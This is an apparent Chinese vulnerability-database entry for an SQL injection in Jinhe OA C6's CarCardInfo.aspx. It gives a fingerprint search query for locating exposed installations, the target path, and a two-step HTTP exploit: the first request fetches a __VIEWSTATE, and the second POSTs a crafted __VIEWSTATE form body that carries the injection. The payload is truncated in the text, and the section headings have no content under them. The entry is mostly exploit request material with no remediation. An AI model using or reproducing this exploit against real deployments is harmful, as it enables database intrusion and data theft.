# 金和OAC6CarCardInfo存在SQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="金和 OA"`
- **请求**：`GET /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1`

**请求体 / payload**
```
1. 获取`__VIEWSTATE`
Host:
Cookie: ASP.NET_SessionId=4f3tjvzxcv5jafpefj14hsj0; myie=false
Content-Length: 0
2. 通过上一步获取的`__VIEWSTATE`，进行sql注入
POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 2064
Cookie: ASP.NET_SessionId=4f3tjvzxcv5jafpefj14hsj0; myie=false
_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=/wEPDwUKMjAyNTc4NzA3NA8WAh4Ic3RyUXVlcnkFCWRlbGZsYWc9MBYCZg9kFgQCAg8PFgIeBFRleHQFBuafpeivomRkAgMPDxYMHglfUGFnZVNpemUCKB4PX1NvcnRBdHRyaWJ1dGVzMtgDAAEAAAD/////AQAAAAAAAAAMAgAAAFFVc2VyV2ViQ29udHJvbC5EYXRhR3JpZCwgV…（脚本共 2363 字，完整版见原文）
```

**其他**
- 金和OA C6 CarCardInfo存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金和OA